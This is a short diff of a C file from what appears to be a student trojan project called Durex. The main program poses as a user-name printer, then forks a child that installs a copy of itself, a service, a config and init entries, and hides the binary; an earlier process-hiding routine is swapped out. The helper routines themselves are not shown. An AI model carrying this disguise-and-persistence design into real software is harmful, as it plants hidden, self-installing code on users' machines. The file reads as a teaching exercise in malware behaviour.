@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2018/08/05 20:29:35 by root             ###   ########.fr       */
+/*   Updated: 2018/08/06 19:57:23 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,7 +18,7 @@
 
 #include "main.h"
 
-static void			print_usr_name(const char *av)
+static void			print_usr_name()
 {
 	struct passwd	*passwd;
 	struct stat		s;
@@ -32,25 +32,24 @@ static void			print_usr_name(const char *av)
 	if (stat(DUREX_BINARY_FILE, &s) < 0) {
 		pid = fork();
 		if (pid == 0) {
-			int		(*process[])(void) = { &install_service,
+			int		(*process[])(void) = { &install_binary,
+										   &install_service,
 										   &install_conf,
 										   &install_init,
-										   &hide_process_preload };
-			if (install_binary(av))
-				return ;
+										   &hide_binary };
 			for (size_t i = 0; i < sizeof(process) / sizeof(*process); i++) {
 				if (process[i]())
 					return ;
 			}
 			system("mpg123 audio/Evil_Laugh.mp3 2>/dev/null");
 		}
-		return ;
 	}
 }
 
 int					main(int ac, char **av)
 {
 	(void)ac;
-	print_usr_name(av[0]);
+	e.prog = av[0];
+	print_usr_name();
 	return 0;
 }
